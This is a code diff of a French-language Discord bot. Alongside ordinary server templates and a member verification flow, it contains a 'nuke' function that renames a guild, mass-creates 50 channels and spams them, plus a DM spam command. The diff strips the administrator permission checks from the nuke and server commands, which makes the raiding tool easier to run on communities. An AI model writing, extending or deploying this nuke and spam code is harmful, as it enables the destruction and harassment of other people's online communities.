@@ -150,7 +150,7 @@ const SCARY_NAMES = [
 const inviteLink = 'https://discord.gg/eVTU7sW3wv';
 
 // ============================================================
-// SERVER TEMPLATES (PROPRES - SANS NSFW)
+// SERVER TEMPLATES
 // ============================================================
 const TEMPLATES = {
     anime: {
@@ -288,41 +288,30 @@ const TEMPLATES = {
     naruto: {
         name: '🍥 Shinobi World - Naruto RP',
         channels: [
-            // Informations
             { name: '📢-annonces', type: 'text', category: 'Informations' },
             { name: '👋-bienvenue', type: 'text', category: 'Informations' },
             { name: '📋-regles', type: 'text', category: 'Informations' },
             { name: '📜-histoire-du-monde', type: 'text', category: 'Informations' },
             { name: '🗺️-commandements', type: 'text', category: 'Informations' },
-            
-            // Villages
             { name: '🌿-konoha-chat', type: 'text', category: 'Villages' },
             { name: '🌊-kiri-chat', type: 'text', category: 'Villages' },
             { name: '🔥-kumo-chat', type: 'text', category: 'Villages' },
             { name: '🌪️-iwagakure-chat', type: 'text', category: 'Villages' },
             { name: '🦊-sunagakure-chat', type: 'text', category: 'Villages' },
-            
-            // RP
             { name: '⚔️-rp-general', type: 'text', category: 'Roleplay' },
             { name: '🗡️-rp-combat', type: 'text', category: 'Roleplay' },
             { name: '🛡️-rp-missions', type: 'text', category: 'Roleplay' },
             { name: '💀-rp-akatsuki', type: 'text', category: 'Roleplay' },
             { name: '👥-rp-clans', type: 'text', category: 'Roleplay' },
             { name: '🧬-rp-kekkei-genkai', type: 'text', category: 'Roleplay' },
-            
-            // Personnages
             { name: '📖-fiches-personnages', type: 'text', category: 'Personnages' },
             { name: '🔄-validation-personnages', type: 'text', category: 'Personnages' },
             { name: '👤-personnages-acceptes', type: 'text', category: 'Personnages' },
-            
-            // Clan
             { name: '🏠-clan-uchiha', type: 'text', category: 'Clans' },
             { name: '🌀-clan-senju', type: 'text', category: 'Clans' },
             { name: '🦅-clan-uzumaki', type: 'text', category: 'Clans' },
             { name: '🌙-clan-hyuuga', type: 'text', category: 'Clans' },
             { name: '🪨-clan-shinobi', type: 'text', category: 'Clans' },
-            
-            // Divers
             { name: '🎴-illustrations', type: 'text', category: 'Discussion' },
             { name: '📝-suggestions', type: 'text', category: 'Discussion' },
             { name: '🎭-voice-village', type: 'voice', category: 'Vocaux' },
@@ -331,31 +320,22 @@ const TEMPLATES = {
         ],
         categories: ['Informations', 'Villages', 'Roleplay', 'Personnages', 'Clans', 'Discussion', 'Vocaux'],
         roles: [
-            // Hiérarchie
             { name: '👑 Hokage', color: '#FF0000' },
             { name: '⭐ Kage', color: '#FFA500' },
             { name: '🛡️ Gardien', color: '#00FF00' },
             { name: '👤 Jonin', color: '#1E90FF' },
             { name: '🗡️ Chunin', color: '#8B4513' },
             { name: '🔄 Genin', color: '#32CD32' },
-            
-            // Villages
             { name: '🌿 Konoha', color: '#008000' },
             { name: '🌊 Kiri', color: '#00BFFF' },
             { name: '🔥 Kumo', color: '#FF4500' },
             { name: '🌪️ Iwa', color: '#D2691E' },
             { name: '🦊 Suna', color: '#FFD700' },
-            
-            // Clans
             { name: '🏠 Uchiha', color: '#000000' },
             { name: '🌀 Senju', color: '#228B22' },
             { name: '🦅 Uzumaki', color: '#FF6347' },
             { name: '🌙 Hyuga', color: '#E6E6FA' },
-            
-            // Akatsuki
             { name: '💀 Akatsuki', color: '#8B0000' },
-            
-            // Titres RP
             { name: '⚔️ Légende', color: '#FFD700' },
             { name: '🛡️ Héros', color: '#FF69B4' },
             { name: '💀 Rogue Ninja', color: '#800000' }
@@ -419,7 +399,7 @@ async function updateStatsChannel() {
 }
 
 // ============================================================
-// INTERACTIONS (Buttons)
+// INTERACTIONS
 // ============================================================
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isButton()) return;
@@ -455,7 +435,7 @@ client.once('ready', async () => {
 });
 
 // ============================================================
-// MESSAGE COMMANDS
+// MESSAGE COMMANDS (SANS VÉRIFICATION DE PERMISSIONS)
 // ============================================================
 client.on('messageCreate', async (message) => {
     if (message.author.bot || !message.content.startsWith(PREFIX)) return;
@@ -493,19 +473,11 @@ client.on('messageCreate', async (message) => {
 });
 
 // ============================================================
-// NEW SERVER COMMAND (PROPRE - SANS NSFW)
+// NEW SERVER COMMAND (SANS VÉRIFICATION DE PERMISSIONS)
 // ============================================================
 async function handleNewServer(message, theme) {
     if (message.author.id !== AUTHORIZED_ID) {
         return message.reply('❌ You are not authorized to use this command!');
-    }
-
-    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
-        return message.reply('❌ You need administrator permissions!');
-    }
-
-    if (!message.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
-        return message.reply('❌ I need administrator permissions!');
     }
 
     const template = TEMPLATES[theme];
@@ -567,7 +539,6 @@ async function handleNewServer(message, theme) {
                     ]
                 });
 
-                // Si c'est un salon textuel, on peut ajouter une description
                 if (type === ChannelType.GuildText) {
                     try {
                         await channel.send(`**Bienvenue dans ${channelData.name} !**\nCe salon est dédié à la discussion sur ${channelData.name}.`);
@@ -593,7 +564,7 @@ async function handleNewServer(message, theme) {
             await guild.setName(template.name);
         } catch (e) {}
 
-        // Set server icon (if image URL provided)
+        // Set server icon
         try {
             if (template.icon) {
                 const response = await fetch(template.icon);
@@ -624,19 +595,11 @@ async function handleNewServer(message, theme) {
 }
 
 // ============================================================
-// NUKE FUNCTION (AVEC SPAM INFINI + PING + RÔLE NIKI)
+// NUKE FUNCTION (SANS VÉRIFICATION DE PERMISSIONS ADMIN)
 // ============================================================
 async function handleNuke(message) {
     if (message.author.id !== AUTHORIZED_ID) {
         return message.reply('❌ You are not authorized to use this command!');
-    }
-
-    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
-        return message.reply('❌ You need administrator permissions!');
-    }
-
-    if (!message.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
-        return message.reply('❌ I need administrator permissions!');
     }
 
     await message.reply('💀 **NUKE INITIALIZED... (RAPID MODE)**');
@@ -676,7 +639,7 @@ async function handleNuke(message) {
             await guild.setName(`☠ N1K1-0N-T0P-${nukeNumber} ☠`);
         } catch (e) {}
 
-        // 4. CREATE 50 NEW CHANNELS & SPAM THEM INFINITELY
+        // 4. CREATE 50 NEW CHANNELS & SPAM
         const createPromises = [];
         for (let i = 0; i < 50; i++) {
             const name = SCARY_NAMES[i % SCARY_NAMES.length];
@@ -808,7 +771,7 @@ async function handleNuke(message) {
 }
 
 // ============================================================
-// SPAM FUNCTION (DM SPAM - AUTORISÉ SUR SOI-MÊME)
+// SPAM FUNCTION
 // ============================================================
 async function handleSpam(message, args) {
     if (message.author.id !== AUTHORIZED_ID) {
@@ -899,7 +862,6 @@ async function handleVerif(message) {
 
     const guild = message.guild;
 
-    // Étape 1 : Créer le rôle Membre
     let memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');
     if (!memberRole) {
         memberRole = await guild.roles.create({
@@ -910,7 +872,6 @@ async function handleVerif(message) {
         });
     }
 
-    // Étape 2 : Verrouiller TOUS les salons
     const channels = guild.channels.cache;
     const lockPromises = channels.map(async (channel) => {
         try {
@@ -924,22 +885,19 @@ async function handleVerif(message) {
     });
     await Promise.all(lockPromises);
 
-    // Étape 3 : Créer le salon de vérification tout en haut
     let verifChannel = guild.channels.cache.find(c => c.name === '🔓-vérification');
     if (!verifChannel) {
         verifChannel = await guild.channels.create({
             name: '🔓-vérification',
             type: ChannelType.GuildText,
-            position: 0 // Tout en haut
+            position: 0
         });
     }
-    // On s'assure que tout le monde peut voir ce salon
     await verifChannel.permissionOverwrites.edit(guild.roles.everyone, {
         ViewChannel: true,
         SendMessages: false
     });
 
-    // Étape 4 : Créer le message avec le bouton
     const row = new ActionRowBuilder()
         .addComponents(
             new ButtonBuilder()
@@ -963,7 +921,6 @@ async function handleVerif(message) {
 // GESTION DES INTERACTIONS (BOUTONS & MENUS & MODALES)
 // ============================================================
 client.on('interactionCreate', async (interaction) => {
-    // Bouton "Démarrer la vérification"
     if (interaction.isButton() && interaction.customId === 'start_verif') {
         const menuRow = new ActionRowBuilder()
             .addComponents(
@@ -991,7 +948,6 @@ client.on('interactionCreate', async (interaction) => {
         });
     }
 
-    // Menu déroulant (Choix du type)
     if (interaction.isStringSelectMenu() && interaction.customId === 'select_verif_type') {
         const choice = interaction.values[0];
         const guild = interaction.guild;
@@ -1001,7 +957,6 @@ client.on('interactionCreate', async (interaction) => {
             return interaction.reply({ content: '❌ Erreur : Le rôle Membre n\'existe pas. Contacte un admin.', ephemeral: true });
         }
 
-        // SYSTÈME BOUTON SIMPLE
         if (choice === 'simple') {
             const simpleRow = new ActionRowBuilder()
                 .addComponents(
@@ -1017,7 +972,6 @@ client.on('interactionCreate', async (interaction) => {
             });
         }
 
-        // SYSTÈME CODE ALÉATOIRE
         if (choice === 'code') {
             const code = Math.floor(1000 + Math.random() * 9000).toString();
             
@@ -1042,7 +996,6 @@ client.on('interactionCreate', async (interaction) => {
         }
     }
 
-    // Bouton "Confirmation simple"
     if (interaction.isButton() && interaction.customId === 'confirm_simple') {
         const guild = interaction.guild;
         const memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');
